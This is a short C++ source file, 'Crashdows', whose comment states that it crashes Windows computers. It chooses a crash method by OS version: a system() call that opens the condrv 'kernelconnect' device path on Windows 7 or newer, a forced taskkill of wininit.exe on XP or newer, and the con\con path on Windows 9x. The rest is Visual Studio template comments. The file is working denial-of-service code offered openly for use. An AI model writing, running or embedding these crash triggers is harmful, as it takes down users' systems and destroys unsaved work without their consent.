// Crashdows.cpp : This file contains the 'main' function. Program execution begins and ends there.
//Crashdows crashes your Windows computer. This does not run on other operating systems.
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <versionhelpers.h>
int main() {
    if (IsWindows7OrGreater() == 1) {
        //Let's crash the computer using the \\.\globalroot\device\condrv\kernelconnect method.
        system("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
    } else if (IsWindowsXPOrGreater() == 1) {
        //Let's terminate wininit.exe
        system("taskkill /F /T /IM wininit.exe");
    }
    else {
    //This should be 9x, so con\con\con
        system("c:\\con\\con");
    }
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
